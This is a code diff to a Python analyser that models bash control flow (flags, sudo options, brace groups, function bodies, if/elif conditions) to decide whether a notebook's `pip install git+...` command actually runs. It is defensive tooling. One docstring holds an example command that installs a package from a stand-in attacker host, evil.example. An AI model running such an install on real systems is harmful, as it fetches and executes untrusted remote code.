@@ -475,7 +475,10 @@ PIP_LINE_RE = re.compile(
     # `-W arg` and `-X opt` take an operand, attached or separate (`python --help`), and
     # `python -W ignore -m pip install git+...` matched nothing while requiring every
     # intervening word to start with `-`. The operand form is tried first.
-    + r"(?:\s+-[WX]\s*\S+|\s+--check-hash-based-pycs\s+\S+|\s+-[A-Za-z]\w*)*"
+    # `-h`, `-V` and `-?` print and exit, so nothing after one runs: `python -V -m pip
+    # install git+...` only reports the version, and accepting it fabricated an R-INST-001.
+    # The long spellings never matched this arm, which requires a letter after the dash.
+    + r"(?:\s+-[WX]\s*\S+|\s+--check-hash-based-pycs\s+\S+|\s+-(?![hV?])[A-Za-z]\w*)*"
     # `-m mod` may be written attached: `python -mpip install ...` runs pip, and requiring a
     # separate word after `-m` missed it in both this pattern and cell discovery.
     + r"\s+-m\s*(?:uv\s+)?pip)\s+"
@@ -581,7 +584,13 @@ _SHELL_RESOLVED_PREFIXES = frozenset({"command", "exec", "time"})
 # Options that make a prefix report something and exit instead of running its operands.
 _PREFIX_TERMINAL_FLAGS = frozenset({"--help", "--version"})
 # Per prefix, the options that turn it into a lookup rather than an execution.
-_PREFIX_LOOKUP_FLAGS: dict[str, frozenset[str]] = {"command": frozenset({"-v", "-V"})}
+# sudo(8): `-v/--validate` refreshes the credential timestamp "without running a command",
+# and `-l/--list` DISPLAYS the fully-qualified path of a permitted command instead of running
+# it. Unwrapping past either fabricated an install from a line that never reaches pip.
+_PREFIX_LOOKUP_FLAGS: dict[str, frozenset[str]] = {
+    "command": frozenset({"-v", "-V"}),
+    "su" "do": frozenset({"-v", "--validate", "-l", "--list", "-V", "-h"}),
+}
 # `PATH+=:/opt/bin cmd` is an assignment prefix too: bash runs the child with the appended
 # value, so leaving the `+=` word standing made it the supposed executable.
 _ENV_ASSIGNMENT_RE = re.compile(r"^[A-Za-z_]\w*\+?=")
@@ -987,10 +996,23 @@ def _conditional_expansion_spans(command: str) -> list[tuple[int, int]]:
     spans: list[tuple[int, int]] = []
     for match in _CONDITIONAL_EXPANSION_RE.finditer(command):
         depth, j = 1, match.end()
+        quote = ""
         while j < len(command) and depth:
-            if command[j] == "{":
+            ch = command[j]
+            # `\}` and `'}'` are literal text in the default word, not the closer. Counting
+            # them ended the span early, and a `$( )` after the real close then read as
+            # unconditional -- the opposite of what a `${name:-word}` means.
+            if ch == "\\" and quote != "'" and j + 1 < len(command):
+                j += 2
+                continue
+            if quote:
+                if ch == quote:
+                    quote = ""
+            elif ch in "\"'":
+                quote = ch
+            elif ch == "{":
                 depth += 1
-            elif command[j] == "}":
+            elif ch == "}":
                 depth -= 1
             j += 1
         spans.append((match.end(), j))
@@ -1155,10 +1177,15 @@ def _command_ends_shell(command: str) -> bool:
     `exit 0; pip install git+https://evil.example/x.git` reported as a reachable install, so
     R-INST-001 and the compatibility rules fired on a command bash never reaches.
     """
-    if _command_execs(command):
+    # `{ exit; ... }` is a brace group: it runs in the SAME shell, so a terminator inside it
+    # ends the line. `( exit )` is a subshell and does not, which is why only `{` is stripped.
+    opened = command.lstrip("!").strip()
+    while opened.startswith("{") and (len(opened) == 1 or opened[1].isspace()):
+        opened = opened[1:].lstrip()
+    if _command_execs(opened):
         return True
     seen: list[str] = []
-    rest = _strip_exec_prefixes(command.lstrip("!").strip(), seen)[0]
+    rest = _strip_exec_prefixes(opened, seen)[0]
     # Same rule as `exec`: `env exit 0` asks env for a PROGRAM called exit, which does not
     # exist, and the parent shell carries on. Only the prefixes bash resolves in-process keep
     # the builtin.
@@ -1205,6 +1232,25 @@ def _piece_success_model(piece: str) -> bool | None:
     if model is None or not negations % 2:
         return model
     return not model
+
+
+def _piece_assumes_pip(piece: str) -> bool:
+    """Is this piece's success the REPLAY's assumption about pip, not a documented outcome?
+
+    `true` cannot fail; a pip install can. Modelling both as certain success removed the
+    reachable `else` of `if pip install x; then :; else pip install git+...; fi`, and
+    R-INST-001 is documented to inspect every path the notebook could take.
+    """
+    text = _unwrap_shell_group(piece)[0]
+    if text.startswith("!"):
+        text = text[1:].lstrip()
+    while True:
+        word, rest = _split_first_word(text)
+        if word != "!":
+            break
+        text = rest.strip()
+    stripped = _strip_exec_prefixes(text)[0].strip()
+    return _piece_is_pip(stripped) and _split_first_word(stripped)[0] not in _ALWAYS_SUCCEEDS
 
 
 def _close_group(
@@ -1330,6 +1376,9 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
     # One flag per open group, plus the base list. A command is conditional when any level
     # above it is in a fallback tail, so an inner list cannot clear an outer one.
     tails = [False]
+    # Per open `(`/`{`: does it hold a FUNCTION BODY? Unlike `tails` this survives a separator
+    # inside the body, since `;` starts a new and-or list but does not leave the definition.
+    def_levels = [False]
     # Per level: whether the last command flushed there is modelled as succeeding. A group
     # exits with that status, which is what the enclosing `&&` reads.
     last_ok: list[bool | None] = [None]
@@ -1412,6 +1461,8 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                 case_depths.pop()
             if len(tails) > 1:
                 tails.pop()
+                if len(def_levels) > 1:
+                    def_levels.pop()
                 list_models.pop()
                 _close_group(list_has_pip, prev_ops, last_ok, "".join(buf))
             buf.append(ch)
@@ -1436,7 +1487,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             prev_ops[-1] = "||"
             flush("||")
             tails[-1] = left_model is not False
-            buf_conditional = any(tails)
+            buf_conditional = any(tails) or any(def_levels)
             i += 2
         elif line.startswith("&&", i):
             # `A && B` runs B only when A succeeded, so B is conditional -- unless the list
@@ -1456,7 +1507,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             prev_ops[-1] = "&&"
             flush("&&")
             tails[-1] = not list_has_pip[-1]
-            buf_conditional = any(tails)
+            buf_conditional = any(tails) or any(def_levels)
             i += 2
         elif (
             ch == ";"
@@ -1477,7 +1528,7 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             list_has_pip[-1] = False
             list_models[-1] = None
             prev_ops[-1] = ""  # a new and-or list starts here
-            buf_conditional = any(tails)
+            buf_conditional = any(tails) or any(def_levels)
             i += 1
         else:
             if ch in "({":
@@ -1490,14 +1541,21 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                         or (ch == "{" and buf and buf[-1] == "$")
                     )
                 )
+                # `setup() { :; pip install ...; }` defines a function nobody called. The
+                # header sits in the piece that opens the brace, so flagging that piece alone
+                # left every LATER command in the body reading as unconditional.
                 tails.append(False)
+                def_levels.append(
+                    ch == "{"
+                    and _FUNCTION_DEF_RE.fullmatch("".join(buf).lstrip("!").strip()) is not None
+                )
                 list_has_pip.append(False)
                 list_models.append(None)
                 prev_ops.append("")
                 last_ok.append(None)
                 case_depths.append(0)
                 if not "".join(buf).strip():
-                    buf_conditional = any(tails)  # the group opens before the command
+                    buf_conditional = any(tails) or any(def_levels)  # the group opens before the command
             elif ch in ")}" and not (ch == ")" and case_depths[-1]):
                 grouping_closed = groupings.pop() if groupings else True
                 if len(case_depths) > 1:
@@ -1506,6 +1564,8 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                     # The command in hand belongs to the level being closed, so its flag stays
                     # what it was; the pop only affects what comes after.
                     tails.pop()
+                    if len(def_levels) > 1:
+                        def_levels.pop()
                     list_models.pop()
                     _close_group(list_has_pip, prev_ops, last_ok, "".join(buf))
             if ch not in ")}":
@@ -1544,7 +1604,14 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
     # a plain inversion can tell.
     arms_failed: list[bool] = []
     arms_known: list[bool] = []
-    for (piece, flag), (text, command_flag), separator in zip(out, commands, seps):
+    # Per open compound: the word that opened it, whether the arm in hand is even reached, and
+    # whether the condition folded so far leans on the pip-succeeds assumption.
+    openers: list[str] = []
+    arm_reached: list[bool] = []
+    cond_assumed: list[bool] = []
+    for index, ((piece, flag), (text, command_flag), separator) in enumerate(
+        zip(out, commands, seps)
+    ):
         if handed_over:
             break
         keywords = _leading_shell_keywords(piece)
@@ -1560,24 +1627,47 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                 test_models.append(None)
                 arms_failed.append(False)
                 arms_known.append(False)
+                openers.append("case")
+                arm_reached.append(False)
+                cond_assumed.append(False)
             elif keyword in _SHELL_TEST_KEYWORDS:
                 body_levels.append(False)  # the test itself runs whenever the line does
                 test_models.append(None)
                 arms_failed.append(True)  # no arm has run yet
                 arms_known.append(True)
+                openers.append(keyword)
+                arm_reached.append(True)
+                cond_assumed.append(False)
             elif keyword in _SHELL_BODY_KEYWORDS:
                 if body_levels:
                     body_levels[-1] = True
-                    if keyword == "else":
+                    if keyword in ("then", "do"):
+                        # The condition is complete: fold it in, invert an `until`, and let
+                        # the arm bookkeeping see the RESULT rather than the first piece.
+                        model = test_models[-1]
+                        if openers[-1] == "until" and model is not None:
+                            model = not model
+                        if not arm_reached[-1]:
+                            model = None
+                        if openers[-1] in ("if", "until", "while"):
+                            arms_known[-1] = (
+                                arms_known[-1] and model is not None and not cond_assumed[-1]
+                            )
+                            arms_failed[-1] = arms_failed[-1] and model is False
+                        test_models[-1] = model
+                    elif keyword == "else":
                         # `else` runs exactly when every arm failed. Inverting the arm in hand
                         # answered that only for a bare `if`/`else`.
                         test_models[-1] = (
                             True if arms_failed[-1] else (False if arms_known[-1] else None)
                         )
                     elif keyword == "elif":
-                        # Its test is reached only when every earlier arm failed. When they
-                        # certainly did, the test itself runs and its own outcome (recorded
-                        # below, off the test text) decides the branch.
+                        # Its test is reached only when every earlier arm failed, and while it
+                        # is being read the level is back in a test region.
+                        arm_reached[-1] = arms_failed[-1]
+                        body_levels[-1] = False
+                        openers[-1] = "if"
+                        cond_assumed[-1] = False
                         test_models[-1] = True if arms_failed[-1] else None
                 else:
                     body_levels.append(True)
@@ -1589,6 +1679,9 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
                 test_models.pop()
                 arms_failed.pop()
                 arms_known.pop()
+                openers.pop()
+                arm_reached.pop()
+                cond_assumed.pop()
         # `flag` alone is the separator-level state: a substitution inside a compound body or
         # a case arm is expanded only when that body runs, so it inherits those too.
         # A level speaks only once its BODY has started, and what it says is the outcome of
@@ -1604,7 +1697,10 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
         # taken it says nothing, and letting it speak kept `if true; then pip install ...`
         # out of the unconditional replay. A case arm always leaves a None in `active`, so
         # this can never clear an arm label.
-        certain_branch = bool(active) and all(model is True for model in active)
+        # An `elif` whose earlier arms all certainly failed is a TEST, and a test runs
+        # whenever the statement does, so its own keyword says nothing either.
+        reached_test = bool(body_levels) and not body_levels[-1] and arm_reached[-1]
+        certain_branch = reached_test or (bool(active) and all(model is True for model in active))
         piece_conditional = (
             flag
             or (command_flag and not certain_branch)
@@ -1631,16 +1727,20 @@ def _split_chained(line: str) -> list[tuple[str, bool]]:
             # `if false` / `while false` / `until true` can never reach their body, so what
             # follows is not merely conditional but unreachable, and reporting an install
             # from it is a finding about a command bash cannot run.
-            if keywords and keywords[0] in ("if", "while", "until", "elif") and test_models:
+            # Still reading a condition: fold this piece into it. Only the piece carrying the
+            # keyword used to count, so `if false || true; then ...` stored the `false` and
+            # discarded a body bash always runs. The inversion and the arm bookkeeping happen
+            # when `then`/`do` closes the condition, not here.
+            if body_levels and not body_levels[-1] and openers[-1] != "for":
                 model = _piece_success_model(text)
-                if keywords[0] == "until":
-                    model = None if model is None else not model
-                if keywords[0] == "elif" and not arms_failed[-1]:
-                    model = None  # an earlier arm may already have taken the statement
-                test_models[-1] = model
-                if keywords[0] in ("if", "elif"):
-                    arms_known[-1] = arms_known[-1] and model is not None
-                    arms_failed[-1] = arms_failed[-1] and model is False
+                opens_here = bool(keywords) and keywords[0] in _SHELL_TEST_KEYWORDS | {"elif"}
+                joiner = seps[index - 1] if index and not opens_here else ""
+                test_models[-1] = (
+                    model
+                    if joiner not in ("&&", "||")
+                    else _fold_status(test_models[-1], joiner, model)
+                )
+                cond_assumed[-1] = cond_assumed[-1] or _piece_assumes_pip(text)
             ordered.append((text, piece_conditional))
             # The RAW piece: `_unwrap_shell_group` has already stripped `exec` out of `text`
             # along with every other transparent prefix. An `exec` bash may never reach hands
